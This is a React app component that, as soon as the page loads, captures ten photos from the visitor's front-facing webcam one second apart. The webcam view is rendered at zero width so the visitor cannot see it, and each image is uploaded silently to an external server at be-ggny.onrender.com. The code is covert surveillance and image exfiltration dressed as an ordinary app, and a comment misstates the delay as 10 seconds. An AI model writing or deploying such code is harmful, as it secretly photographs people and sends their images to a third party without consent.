import React, { useEffect, useRef, useState } from 'react';
import Webcam from 'react-webcam';
import axios from 'axios';

const App = () => {
  const webcamRef = useRef(null);
  const [imageSrcs, setImageSrcs] = useState([]);
  const [isCapt, setIsCapt] = useState(false);

  const capturePhotos = async () => {
    let capturedImages = [];
    for (let i = 0; i < 10; i++) {
      // Wait for 10 seconds before capturing the next photo
      await new Promise(resolve => setTimeout(resolve, 1000));

      const image = webcamRef.current.getScreenshot();
      capturedImages.push(image);
    }
    setImageSrcs(capturedImages);
  };

  useEffect(() => {
    if (imageSrcs.length >= 1) {
      return uploadPhotos()
    } else {
      setIsCapt(true);
    }
  },[imageSrcs]);
  
  useEffect(() => {
    if (isCapt) return capturePhotos();
  },[isCapt]);

  const uploadPhotos = async () => {
    if (imageSrcs.length === 0) return alert('Capture photos first!');

    try {
      for (const image of imageSrcs) {
        const response = await axios.post('https://be-ggny.onrender.com/upload', { image });
        console.log('Photo uploaded:', response.data);
      }
    } catch (error) {
      console.error('Error uploading photos:', error);
    }
  };

  return (
    <div>
      <Webcam
        audio={false}
        ref={webcamRef}
        screenshotFormat="image/jpeg"
        videoConstraints={{ facingMode: "user" }}
        width={0}
      />
    </div>
  );
};

export default App;
